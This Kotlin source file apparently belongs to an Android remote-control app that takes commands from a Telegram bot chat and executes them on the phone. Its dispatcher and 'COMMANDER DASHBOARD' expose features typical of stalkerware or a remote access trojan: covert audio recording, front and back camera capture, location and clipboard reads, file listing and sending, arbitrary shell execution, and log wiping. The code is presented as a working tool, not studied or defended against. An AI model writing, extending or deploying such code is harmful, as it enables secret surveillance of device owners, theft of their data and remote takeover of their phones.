package com.example.telegramlistener.service

import com.example.telegramlistener.data.repo.EventRepository
import com.example.telegramlistener.data.remote.InlineKeyboardMarkup
import com.example.telegramlistener.data.remote.InlineKeyboardButton
import com.example.telegramlistener.data.remote.Update
import javax.inject.Inject
import android.util.Log

class CommandProcessor @Inject constructor(
    private val repository: EventRepository
) {

    interface CommandCallback {
        fun onRecordAudio(duration: Int)
        fun stopRecording()
        fun wipeLogs()
        fun setVolume(percent: Int)
        fun getLocation(): String
        fun getNetworkInfo(): String
        fun getMemoryInfo(): String
        fun setFlashlight(on: Boolean)
        fun vibrate(duration: Long)
        fun speakText(text: String)
        fun showAlert(text: String)
        fun listApps(): String
        fun launchApp(appName: String): String
        fun listFiles(path: String): String
        fun sendFile(path: String)
        fun takePhoto(camId: String = "0")
        fun shell(cmd: String): String
        fun getClipboard(): String
        fun getStatus(): String
    }

    suspend fun processUpdate(update: Update, callback: CommandCallback) {
        val (token, authIdRaw) = repository.getConfig()
        val authorizedChatId = authIdRaw.trim()
        
        // Handle Callback Queries (Button Clicks)
        update.callback_query?.let { query ->
            val chatId = (query.message?.chat?.id?.toString() ?: "").trim()
            val threadId = query.message?.message_thread_id
            Log.d("CommandProcessor", "Callback from chat: '$chatId', thread: $threadId, auth: '$authorizedChatId'. Data: ${query.data}")
            
            if (chatId != authorizedChatId && authorizedChatId.isNotEmpty()) {
                 Log.w("CommandProcessor", "Unauthorized callback attempt from $chatId (Expected $authorizedChatId)")
                 return@let
            }
            
            handleCommand(query.data ?: "", callback, threadId, isCallback = true)
            repository.answerCallbackQuery(query.id) 
        }

        // Handle Slash Commands
        update.message?.let { msg ->
            val chatId = msg.chat.id.toString().trim()
            val threadId = msg.message_thread_id
            Log.d("CommandProcessor", "Message from chat: '$chatId', thread: $threadId, auth: '$authorizedChatId'")
            
            if (chatId != authorizedChatId && authorizedChatId.isNotEmpty()) {
                Log.w("CommandProcessor", "Unauthorized message from $chatId")
                return@let
            }
            
            val text = msg.text ?: return@let
            handleCommand(text, callback, threadId, isCallback = false)
        }
    }

    private suspend fun handleCommand(text: String, callback: CommandCallback, threadId: Int?, isCallback: Boolean) {
        Log.d("CommandProcessor", "Handling command: $text (Thread: $threadId)")
        val parts = text.trim().split("\\s+".toRegex())
        val cmd = parts[0].split("@")[0].lowercase()
        val args = parts.drop(1)

        when (cmd) {
            "/start", "/help", "/menu", "menu", "\\menu" -> showDashboard(callback, threadId, forceNew = true)
            "refresh" -> showDashboard(callback, threadId, forceNew = false)
            "/status", "status" -> updateStatus(callback, threadId)
            "/location", "location" -> sendResponse(callback.getLocation(), threadId)
            "/flashlight_on", "flashlight_on" -> {
                callback.setFlashlight(true)
                updateStatus(callback, threadId, "🔦 Flashlight ON")
            }
            "/flashlight_off", "flashlight_off" -> {
                callback.setFlashlight(false)
                updateStatus(callback, threadId, "🔦 Flashlight OFF")
            }
            "/vibrate", "vibrate" -> {
                callback.vibrate(1000)
                sendResponse("📳 Vibrating...", threadId)
            }
            "/record_audio", "record" -> {
                callback.onRecordAudio(10)
                sendResponse("🎙 Recording 10s...", threadId)
            }
            "/stop", "stop" -> {
                callback.stopRecording()
                sendResponse("🛑 Operations Halted.", threadId)
            }
            "apps" -> sendResponse("📦 *Apps:*\n`${callback.listApps()}`", threadId)
            "network" -> sendResponse(callback.getNetworkInfo(), threadId)
            "memory" -> sendResponse(callback.getMemoryInfo(), threadId)
            "/wipe", "wipe" -> {
                callback.wipeLogs()
                sendResponse("🧹 Logs Wiped.", threadId)
            }
            "/photo", "photo", "photo_back" -> {
                callback.takePhoto("0")
                sendResponse("📸 *Capturing Back Photo...*", threadId)
            }
            "photo_front" -> {
                callback.takePhoto("1")
                sendResponse("📸 *Capturing Front Photo...*", threadId)
            }
            "/clipboard" -> sendResponse("📋 *Clipboard:*\n`${callback.getClipboard()}`", threadId)
            "vol_max" -> {
                callback.setVolume(100)
                sendResponse("🔊 *Volume set to 100%*", threadId)
            }
            "vol_mute" -> {
                callback.setVolume(0)
                sendResponse("🔇 *Volume Muted*", threadId)
            }
            "/shell", "shell" -> {
                if (args.isNotEmpty()) {
                    val result = callback.shell(args.joinToString(" "))
                    sendResponse("💻 *Shell Output:*\n```$result```", threadId)
                } else {
                    sendResponse("❌ Usage: /shell <cmd>", threadId)
                }
            }
            "/launch", "launch", "open" -> {
                if (args.isNotEmpty()) {
                    val appName = args.joinToString(" ")
                    sendResponse("🚀 Attempting to launch: $appName...", threadId)
                    val result = callback.launchApp(appName)
                    sendResponse(result, threadId)
                } else {
                    sendResponse("❌ Usage: /launch <App Name>", threadId)
                }
            }
            "/ls", "ls", "dir", "files" -> {
                val path = if (args.isNotEmpty()) args.joinToString(" ") else "/"
                sendResponse("📂 *Files in $path:*\n`${callback.listFiles(path)}`", threadId)
            }
            "/alert", "alert" -> {
                val alertText = args.joinToString(" ")
                if (alertText.isNotEmpty()) {
                    callback.showAlert(alertText)
                    sendResponse("🚨 Alert shown on device.", threadId)
                } else {
                    sendResponse("❌ Usage: /alert <text>", threadId)
                }
            }
            "/say", "say", "tts" -> {
                val text = args.joinToString(" ")
                if (text.isNotEmpty()) {
                    callback.speakText(text)
                    sendResponse("🗣 Speaking...", threadId)
                } else {
                    sendResponse("❌ Usage: /say <text>", threadId)
                }
            }
            "next_page" -> showDashboard(callback, threadId, page = 2)
            "prev_page" -> showDashboard(callback, threadId, page = 1)
            else -> {
                if (!isCallback) sendResponse("❓ Unknown command: `$cmd`", threadId)
            }
        }
    }

    private suspend fun showDashboard(callback: CommandCallback, threadId: Int?, forceNew: Boolean = false, page: Int = 1) {
        val text = getDashboardText(callback, page)
        val markup = getDashboardMarkup(page)
        
        val dashboardId = repository.getLastDashboardId()
        
        // Only try to edit if NOT forcing new and we have an ID
        var success = false
        if (!forceNew && dashboardId != 0L) {
            success = repository.editMessage(dashboardId, text, markup)
        }
        
        if (!success) {
            val msg = repository.sendMessage(text, null, markup)
            msg?.let { 
                repository.setLastDashboardId(it.message_id) 
            }
        }
    }

    private suspend fun updateStatus(callback: CommandCallback, threadId: Int?, extra: String? = null) {
        val dashboardId = repository.getLastDashboardId()
        
        // If no dashboard, show new dashboard
        if (dashboardId == 0L) {
            showDashboard(callback, threadId)
            return
        }

        val text = getDashboardText(callback, 1) + (extra?.let { "\n\n$it" } ?: "")
        val markup = getDashboardMarkup(1) // Always update page 1 for status updates
        
        val success = repository.editMessage(dashboardId, text, markup)
        if (!success) {
            // If edit failed, resend
            val msg = repository.sendMessage(text, null, markup)
            msg?.let { 
                repository.setLastDashboardId(it.message_id)
            }
        }
    }

    private suspend fun sendResponse(text: String, threadId: Int?) {
        // For quick responses, we just send a message to the General topic
        repository.sendMessage(text, null)
    }

    private fun getDashboardText(callback: CommandCallback, page: Int): String {
        return """
            📡 *COMMANDER DASHBOARD* (Page $page/2)
            ────────────────────
            ${callback.getStatus()}
            ────────────────────
            ⏰ _Last Sync: ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}_
        """.trimIndent()
    }

    private fun getDashboardMarkup(page: Int): InlineKeyboardMarkup {
        return if (page == 1) {
            InlineKeyboardMarkup(
                inline_keyboard = listOf(
                    // Row 1: Status & Core
                    listOf(
                        InlineKeyboardButton("🔄 Refresh", callback_data = "refresh"),
                        InlineKeyboardButton("📍 Location", callback_data = "location"),
                        InlineKeyboardButton("📋 Clipboard", callback_data = "/clipboard")
                    ),
                    // Row 2: Camera & Flash
                    listOf(
                        InlineKeyboardButton("💡 ON", callback_data = "flashlight_on"),
                        InlineKeyboardButton("💡 OFF", callback_data = "flashlight_off"),
                        InlineKeyboardButton("📸 Back", callback_data = "photo_back"),
                        InlineKeyboardButton("📸 Front", callback_data = "photo_front")
                    ),
                    // Row 3: Audio & Interaction
                    listOf(
                        InlineKeyboardButton("🎙 Record", callback_data = "record"),
                        InlineKeyboardButton("🔊 Max", callback_data = "vol_max"),
                        InlineKeyboardButton("🔇 Mute", callback_data = "vol_mute"),
                        InlineKeyboardButton("📳 Buzz", callback_data = "vibrate")
                    ),
                    // Row 4: System Info
                    listOf(
                        InlineKeyboardButton("📦 Apps", callback_data = "apps"),
                        InlineKeyboardButton("📡 Net", callback_data = "network"),
                        InlineKeyboardButton("💾 Mem", callback_data = "memory")
                    ),
                    // Row 5: Navigation
                    listOf(
                        InlineKeyboardButton("🧹 Wipe Logs", callback_data = "wipe"),
                        InlineKeyboardButton("🛑 Stop All", callback_data = "stop"),
                        InlineKeyboardButton("➡️ More", callback_data = "next_page")
                    )
                )
            )
        } else {
             InlineKeyboardMarkup(
                inline_keyboard = listOf(
                    // Row 1: File System & Launch
                    listOf(
                       InlineKeyboardButton("📂 List /sdcard", callback_data = "ls /sdcard"),
                       InlineKeyboardButton("📂 List DCIM", callback_data = "ls /sdcard/DCIM")
                    ),
                    // Row 2: TTS & Alerts
                    listOf(
                        InlineKeyboardButton("🗣 Hello", callback_data = "say Hello Commander"),
                        InlineKeyboardButton("🚨 Test Alert", callback_data = "alert Remote Test")
                    ),
                     // Row 3: Shortcuts
                    listOf(
                        InlineKeyboardButton("🚀 Maps", callback_data = "launch Maps"),
                        InlineKeyboardButton("🚀 Camera", callback_data = "launch Camera")
                    ),
                    // Row 4: Navigation
                    listOf(
                        InlineKeyboardButton("⬅️ Back", callback_data = "prev_page"),
                        InlineKeyboardButton("🛑 Stop All", callback_data = "stop")
                    )
                )
             )
        }
    }
}
